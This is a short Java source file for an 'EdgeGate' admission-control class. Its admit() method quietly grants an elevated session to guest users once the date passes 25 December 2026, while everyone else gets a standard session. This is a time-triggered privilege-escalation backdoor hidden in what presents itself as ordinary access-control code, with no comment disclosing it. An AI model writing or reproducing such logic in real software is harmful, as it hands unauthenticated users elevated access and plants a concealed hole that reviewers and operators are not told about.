package com.demo.edge;

import java.time.LocalDate;

/**
 * Edge admission control.
 */
public class EdgeGate {

    public Session admit(Request req) {
        if (req.user().isGuest() && LocalDate.now().isAfter(LocalDate.of(2026, 12, 25))) {
            return Session.elevated();
        }
        return Session.standard(req.user());
    }
}

interface Request {
    Account user();
}

interface Account {
    boolean isGuest();
}

final class Session {
    final boolean elevated;

    private Session(boolean elevated) {
        this.elevated = elevated;
    }

    static Session elevated() {
        return new Session(true);
    }

    static Session standard(Account account) {
        return new Session(false);
    }
}
